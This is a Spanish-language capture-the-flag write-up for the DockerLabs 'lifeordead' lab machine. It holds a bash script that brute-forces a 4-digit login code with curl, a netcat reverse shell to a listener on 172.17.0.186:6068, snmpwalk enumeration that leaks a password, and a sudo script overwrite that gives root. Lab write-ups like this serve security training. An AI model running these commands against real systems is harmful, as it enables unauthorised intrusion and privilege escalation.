## Enumeracion de Puertos, Servicios y Versiones

```bash
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

![image](https://github.com/user-attachments/assets/2d25abfb-0dfd-4986-af70-42110692973a)

nmap reporta 2 servicios, http y ssh por lo que comienzo chequeando el servicio web

![image](https://github.com/user-attachments/assets/d037a530-a5e4-4a97-a4e9-2a62660bab82)

nos conseguimos con la plantilla por defecto de apache, si chequeo el codigo fuente me consigo con la cadena `UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU` y el dominio `lifeordead.dl`

![image](https://github.com/user-attachments/assets/aefbb2b5-79a3-4ad0-9183-dd230f294709)

![image](https://github.com/user-attachments/assets/13503304-0511-41bf-875a-def4981e03d4)

```bash
echo '172.17.0.2  lifeordead.dl' >> /etc/hosts # agrego el dominio en /etc/hosts
```

```bash
echo 'UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU' |base64 -d
PASSWORDADMINSUPERSECRET
```

![image](https://github.com/user-attachments/assets/2518a73d-9412-4eeb-a809-f6e5ae299cfd)

ahora vuelvo a chequear el servicio web pero esta vez haciendo uso del dominio `lifeordead.dl`

![image](https://github.com/user-attachments/assets/7186627b-9bb6-4e91-a809-e5e232678cf1)

nos conseguimos con un panel de login, testeo con las credenciales `admin:PASSWORDADMINSUPERSECRET` (el usuario lo deduzco por la password)

![image](https://github.com/user-attachments/assets/1869b340-23e8-4044-a1c6-3795e0d815dc)

ahora nos solicita un codigo de 4 digitos y por lo visto existen 10 intentos antes de que se bloquee por 30 segundos, sabiendo esto desarrollo un script en `bash` para
realizar el ataque e intentar conseguir dicho codigo de 4 digitos

```bash
#!/bin/bash
#darksblack

#colores
CRE='\033[31m'  # Rojo
CYE='\033[33m' #amarillo
BLD='\033[1m'  # regrita
CNC='\033[0m' #reseteo de colores

printf "${BLD}${CRE}"
printf "                                                           \n"
printf "     _ _  __                    _                _      \n"
printf "    | (_)/ _| ___  ___  _ __ __| | ___  __ _  __| |       \n"
printf "    | | | |_ / _ \/ _ \|  __/ _  |/ _ \/ _  |/ _  |      \n"
printf "    | | |  _|  __/ (_) | | | (_| |  __/ (_| | (_| |      \n"
printf "    |_|_|_|  \___|\___/|_|  \__,_|\___|\__,_|\__,_|     \n"
printf "                                                             \n"

printf "${BLD}${CYE}"
numworlist="numwordlist" #wordlist

# comprobaciones: se valida que exista la wordlist y si no existe se procede a validar si crunch esta instalado en el sistema
# si crunch no esta instalado se procede con su instalacion y posteriormente se procede a crear la wordlist
# si la wordlist existe, se salta todo y procede con el ataque
if [[ ! -f $numworlist ]]; then

    echo "La wordlist no existe, comprobando si crunch esta instalado en el sistema!"
    dpkg --list |grep crunch >/dev/null 2>&1
    if [[ $? == 1 ]]; then
        echo "crunch no instalado, procediendo a su instalacion"
        sudo apt install crunch >/dev/null 2>&1
        if [[ $? == 0 ]]; then
             echo "instalacion exitosa, procediendo a crear la wordlist"
             crunch 4 4 0123456789 2>&1 |grep -v Crunch |grep -v MB |grep -v GB |grep -v TB |grep -v PB > numwordlist
             echo "wordlist creada, procediendo con el ataque"
        else
             echo "No se pudo instalar crunch, ejecute como root"
        fi
    else
         echo "crunch existe en el sistema! procediendo a crear la wordlist"
         crunch 4 4 0123456789 2>&1 |grep -v Crunch |grep -v MB |grep -v GB |grep -v TB |grep -v PB > numwordlist
         echo "wordlist creada, procediendo con el ataque"
    fi

fi


echo ""
echo "Iniciando Ataque ;)"

sleep 2

# ataque para localizar el codigo de 4 digitos
while read -r num; do

      curl -i -X POST http://lifeordead.dl/pageadmincodeloginvalidation.php -F code=$num 2>&1 |grep "failed" > /dev/null 2>&1

      if [[ $? == 1 ]]; then
           break
      fi
done < "$numworlist"
printf "$CNC"
printf "${BLD}${CRE}"
# se imprime el codigo de 4 digitos valido
echo "Code = $num"
printf "$CNC"
```

lo guardo como `lifeordead.sh` y le asigno permisos de ejecucion `chmod +x lifeordead.sh` y procedo a ejecutarlo

https://github.com/user-attachments/assets/cb1180db-3a95-4f63-959f-1a887969a70f

he conseguido el codigo para acceder `0081`

![image](https://github.com/user-attachments/assets/7e3dde65-f606-4810-841a-a80116b5f06f)

obtenemos el codigo secreto `bbb2c5e63d2ef893106fdd0d797aa97a` y si intento decodificarlo no doy con nada asi que al continuar revisando la web y su codigo fuente
consigo lo que podria ser un usuario en `http://lifeordead.dl/pageadmincodelogin.html`

![image](https://github.com/user-attachments/assets/d592a658-bbcf-4a7c-856b-34ff4331589c)

y si testeo con `dimer` y `bbb2c5e63d2ef893106fdd0d797aa97a` por `ssh`

![image](https://github.com/user-attachments/assets/e7d11c78-75d2-4b10-9a3c-d87aa6bf55af)

## Escalada de Privilegios

### dimer

![image](https://github.com/user-attachments/assets/e8882891-fd0b-4b86-9dee-5c3f044402a6)

si chequeo el script

![image](https://github.com/user-attachments/assets/8a70018c-cad1-4d2a-b0bc-ec8219206a28)

Este script está configurando una dirección IP y un puerto usando cálculos bit a bit, y luego usa netcat para abrir una conexión a esa dirección IP y puerto, 
ejecutando un shell de bash (/bin/bash). El script se conecta a la dirección IP 172.17.0.186 en el puerto 6068, para poder recibir esta conexion agregare la
ip `172.17.0.186` a mi host

```bash
ip addres add 172.17.0.186/16 dev docker0
```

ahora me puedo colocar en escucha por el puerto 6068

```bash
nc -lnvp 6068
```

procedo a ejecutar el script `/opt/life.sh`

```bash
sudo -u bilter /opt/life.sh
```

![image](https://github.com/user-attachments/assets/f6d67418-cb7b-4fe6-8cbb-bc538585001e)

### bilter

tratamos la tty para poder tener mejor control

```bash
script /dev/null -c bash 
Z^
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```

![image](https://github.com/user-attachments/assets/701d25b1-7f6e-4854-97a6-af3c2c715abf)

puedo ejecutar un script como root, si intento leer el contenido del script no tengo permisos

![image](https://github.com/user-attachments/assets/45d8fef4-31bc-437d-ac79-cc2e4f758a91)

pero al ejecutarlo limpia la terminal e imprime el numer `161`

![image](https://github.com/user-attachments/assets/6cc97313-adfc-4ee4-a908-aaa12ceacc2b)

despues de una larga busqueda a ver de que trataba esto, me doy cuenta que al ejecutar el script tambien se ejecuta en segundo plano el servicio `snmpd`, lo que 
ahora me hace comprender el numero `161` que imprime el script, ya que se trata del puerto expuesto donde corre dicho servicio tan solo que es por el protocolo `udp`
y no `tcp`

![image](https://github.com/user-attachments/assets/574c8a91-524a-44cf-a4f3-5e320060e958)

para comprobar esto, escaneare dicho puerto con nmap pero usando el protocolo `udp`

```bash
nmap -sU -sC -sV -p161 172.17.0.2
```

![image](https://github.com/user-attachments/assets/29d54de0-46ff-468d-8349-40dea371be5d)

ahora hare uso de la herramienta `snmpwalk` para obtener informacion sobre el estado y la configuracion del servidor `172.17.0.2`

```bash
snmpwalk -v 1 -c public 172.17.0.2

iso.3.6.1.2.1.1.1.0 = STRING: "Linux dockerlabs 6.11.2-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.11.2-1kali1 (2024-10-15) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (372063) 1:02:00.63
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@lifeordead.dl>"
iso.3.6.1.2.1.1.5.0 = STRING: "dockerlabs"
iso.3.6.1.2.1.1.6.0 = STRING: "This port must be disabled aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw="
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (804626) 2:14:06.26
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 02 02 10 06 36 00 2B 01 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-6.11.2-amd64 root=UUID=01dc84be-1a9e-4188-93ae-2e0389720d04 ro quiet splash
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 20
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
End of MIB
```

se puede observar el string `aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw=` que podria ser base32 o 64 asi que tras testear 

```bash
echo 'aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw=' |base64 -d
imposiblepassworduserfinal
```

ahora tengo la password del usuario `purter`

```bash
su purter
pass: imposiblepassworduserfinal
```

### purter

![image](https://github.com/user-attachments/assets/0229ccfa-74fb-4340-8706-a78af51f54cc)

el script que puedo ejecutar como `root` se encuentra en el directorio del usuario `purter` por lo que sin importar su contenido ejecuto lo sigueinte:

```bash
rm -rf /home/purter/.script.sh && echo '/bin/bash' > /home/purter/.script.sh && chmod +x /home/purter/.script.sh && sudo /home/purter/.script.sh
```
obtengo la shell como `root`

![image](https://github.com/user-attachments/assets/1e6959c2-6bdd-4aba-831f-f9fb7fb63ea9)


### PWNET-ROOT
